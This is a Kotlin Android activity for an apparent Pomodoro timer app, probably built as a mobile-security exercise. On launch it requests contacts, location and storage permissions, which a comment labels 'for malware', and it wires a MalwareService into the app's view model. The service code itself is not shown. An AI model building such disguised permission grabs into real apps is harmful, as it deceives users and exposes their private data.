package com.mobileSec.pomodoroapp

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.core.content.ContextCompat
import androidx.lifecycle.viewmodel.compose.viewModel
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.mobileSec.pomodoroapp.malware.MalwareService
import com.mobileSec.pomodoroapp.repository.TimerRepository
import com.mobileSec.pomodoroapp.repository.TodoRepository
import com.mobileSec.pomodoroapp.ui.screen.MainScreen
import com.mobileSec.pomodoroapp.ui.screen.SettingsScreen
import com.mobileSec.pomodoroapp.ui.theme.PomodoroAppTheme
import com.mobileSec.pomodoroapp.viewmodel.MainViewModel
import com.mobileSec.pomodoroapp.viewmodel.MainViewModelFactory
import com.mobileSec.pomodoroapp.data.local.database.PomodoroDatabase

class MainActivity : ComponentActivity() {

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        // Handle permission results
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Request dangerous permissions for malware
        requestPermissions()

        // Initialize database and repositories
        val database = PomodoroDatabase.getDatabase(this)
        val todoRepository = TodoRepository(database.todoDao())
        val timerRepository = TimerRepository(database.timerSessionDao())
        val malwareService = MalwareService(this)

        setContent {
            PomodoroAppTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    val navController = rememberNavController()
                    val viewModel: MainViewModel = viewModel(
                        factory = MainViewModelFactory(
                            todoRepository,
                            timerRepository,
                            malwareService
                        )
                    )

                    NavHost(
                        navController = navController,
                        startDestination = "main"
                    ) {
                        composable("main") {
                            MainScreen(
                                viewModel = viewModel,
                                onNavigateToSettings = {
                                    navController.navigate("settings")
                                }
                            )
                        }

                        composable("settings") {
                            SettingsScreen(
                                viewModel = viewModel,
                                onNavigateBack = {
                                    navController.popBackStack()
                                }
                            )
                        }
                    }
                }
            }
        }
    }

    private fun requestPermissions() {
        val permissions = arrayOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_EXTERNAL_STORAGE
        )

        val permissionsToRequest = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (permissionsToRequest.isNotEmpty()) {
            requestPermissionLauncher.launch(permissionsToRequest.toTypedArray())
        }
    }
}
